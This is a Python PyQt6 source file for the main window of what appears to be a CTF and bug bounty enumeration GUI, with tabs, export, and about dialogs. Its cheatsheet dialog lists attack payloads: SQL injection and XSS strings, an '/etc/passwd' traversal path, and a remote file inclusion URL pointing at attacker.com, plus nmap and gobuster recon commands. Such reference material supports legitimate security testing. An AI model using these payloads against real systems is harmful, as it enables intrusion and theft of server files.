"""
Main application window
"""
from PyQt6.QtWidgets import (
    QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QTabWidget,
    QLabel, QPushButton, QLineEdit, QCheckBox, QComboBox,
    QTextEdit, QProgressBar, QStatusBar, QMenuBar, QMenu,
    QMessageBox, QFileDialog
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt6.QtGui import QFont, QIcon
import asyncio
import json
from pathlib import Path

from ui.web_panel import WebScannerPanel
from ui.os_panel import OSEnumeratorPanel


class ScannerThread(QThread):
    """Worker thread for scanning"""
    progress = pyqtSignal(str)
    finished = pyqtSignal(dict)
    error = pyqtSignal(str)
    
    def __init__(self, task_func, args):
        super().__init__()
        self.task_func = task_func
        self.args = args
    
    def run(self):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(self.task_func(*self.args))
            self.finished.emit(result)
        except Exception as e:
            self.error.emit(str(e))


class CTFEnumToolWindow(QMainWindow):
    """Main application window"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CTF & Bug Bounty Enumeration Tool v1.0")
        self.setGeometry(100, 100, 1400, 900)
        
        # Create central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Create main layout
        main_layout = QVBoxLayout(central_widget)
        
        # Create menu bar
        self.create_menu_bar()
        
        # Create tab widget
        self.tabs = QTabWidget()
        
        # Create panels
        self.web_panel = WebScannerPanel()
        self.os_panel = OSEnumeratorPanel()
        
        # Add tabs
        self.tabs.addTab(self.web_panel, "🌐 Web Scanning")
        self.tabs.addTab(self.os_panel, "🖥️ OS Enumeration")
        
        main_layout.addWidget(self.tabs)
        
        # Create status bar
        self.statusbar = QStatusBar()
        self.setStatusBar(self.statusbar)
        self.statusbar.showMessage("Ready")
        
        # Apply stylesheet
        self.apply_stylesheet()
    
    def create_menu_bar(self):
        """Create menu bar"""
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu("&File")
        
        export_action = file_menu.addAction("&Export Results")
        export_action.triggered.connect(self.export_results)
        
        file_menu.addSeparator()
        
        exit_action = file_menu.addAction("E&xit")
        exit_action.triggered.connect(self.close)
        
        # Tools menu
        tools_menu = menubar.addMenu("&Tools")
        
        cheatsheet_action = tools_menu.addAction("&Cheatsheet")
        cheatsheet_action.triggered.connect(self.show_cheatsheet)
        
        vuln_db_action = tools_menu.addAction("&Vulnerability DB")
        vuln_db_action.triggered.connect(self.show_vuln_db)
        
        # Help menu
        help_menu = menubar.addMenu("&Help")
        
        about_action = help_menu.addAction("&About")
        about_action.triggered.connect(self.show_about)
    
    def apply_stylesheet(self):
        """Apply dark theme stylesheet"""
        stylesheet_path = Path(__file__).parent / "styles.qss"
        if stylesheet_path.exists():
            with open(stylesheet_path, 'r') as f:
                self.setStyleSheet(f.read())
    
    def export_results(self):
        """Export scan results"""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export Results",
            "",
            "JSON Files (*.json);;CSV Files (*.csv);;All Files (*)"
        )
        
        if file_path:
            try:
                active_tab = self.tabs.currentWidget()
                results = active_tab.get_results()
                
                with open(file_path, 'w') as f:
                    json.dump(results, f, indent=2)
                
                QMessageBox.information(
                    self,
                    "Success",
                    f"Results exported to {file_path}"
                )
                self.statusbar.showMessage(f"Exported to {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Export failed: {str(e)}")
    
    def show_cheatsheet(self):
        """Show cheatsheet"""
        from PyQt6.QtWidgets import QDialog, QTextBrowser, QVBoxLayout
        
        dialog = QDialog(self)
        dialog.setWindowTitle("Penetration Testing Cheatsheet")
        dialog.setGeometry(200, 200, 800, 600)
        
        layout = QVBoxLayout()
        browser = QTextBrowser()
        
        cheatsheet_text = """
        <h2>Web Application Penetration Testing</h2>
        <h3>Reconnaissance</h3>
        <ul>
            <li><b>Subdomain Enumeration:</b> crt.sh, dnsdumpster, subfinder</li>
            <li><b>DNS Lookup:</b> nslookup, dig, host</li>
            <li><b>WHOIS:</b> whois, amass</li>
            <li><b>Web Server Info:</b> curl -I, whatweb</li>
        </ul>
        
        <h3>Directory & File Discovery</h3>
        <ul>
            <li><b>Common Paths:</b> /admin, /api, /backup, /config</li>
            <li><b>Tools:</b> gobuster, dirsearch, ffuf</li>
            <li><b>Common Extensions:</b> .php, .txt, .bak, .zip, .sql</li>
        </ul>
        
        <h3>Common Vulnerabilities</h3>
        <ul>
            <li><b>SQL Injection:</b> ' OR '1'='1, sqlmap</li>
            <li><b>XSS:</b> &lt;script&gt;alert('XSS')&lt;/script&gt;</li>
            <li><b>CSRF:</b> Check for CSRF tokens</li>
            <li><b>LFI:</b> ../../../etc/passwd</li>
            <li><b>RFI:</b> ?page=http://attacker.com/shell.php</li>
        </ul>
        
        <h3>OS & Network Enumeration</h3>
        <ul>
            <li><b>Port Scanning:</b> nmap, masscan</li>
            <li><b>OS Detection:</b> nmap -O, p0f</li>
            <li><b>Service Enumeration:</b> nmap -sV, banner grabbing</li>
            <li><b>Vulnerability Scanning:</b> nessus, openvas</li>
        </ul>
        
        <h3>Useful Commands</h3>
        <pre>
# Subdomain enumeration
amass enum -d target.com

# Directory busting
gobuster dir -u http://target.com -w wordlist.txt

# Port scanning
nmap -sV -p- target.com

# Technology identification
whatweb target.com

# Vulnerability scanning
nikto -h target.com
        </pre>
        """
        
        browser.setHtml(cheatsheet_text)
        layout.addWidget(browser)
        dialog.setLayout(layout)
        dialog.exec()
    
    def show_vuln_db(self):
        """Show vulnerability database"""
        QMessageBox.information(
            self,
            "Vulnerability Database",
            """Integrated vulnerability sources:
            
• ExploitDB - Public exploit database
• NIST NVD - National Vulnerability Database
• CVE.org - Common Vulnerabilities and Exposures
• GitHub - Public POC repositories
• Shodan - Internet device search engine

Use the web scanner to automatically search vulnerabilities!
            """
        )
    
    def show_about(self):
        """Show about dialog"""
        QMessageBox.about(
            self,
            "About CTF & Bug Bounty Enum Tool",
            """CTF & Bug Bounty Enumeration Tool v1.0
            
A comprehensive GUI application for web and OS enumeration
during penetration testing and bug bounty activities.

Features:
• Web scanning and subdomain enumeration
• Directory and file busting
• Technology identification
• OS and port enumeration
• Vulnerability database search
• Dynamic checklists with OWASP/NIST compliance

Author: Security Researcher
License: MIT
            """
        )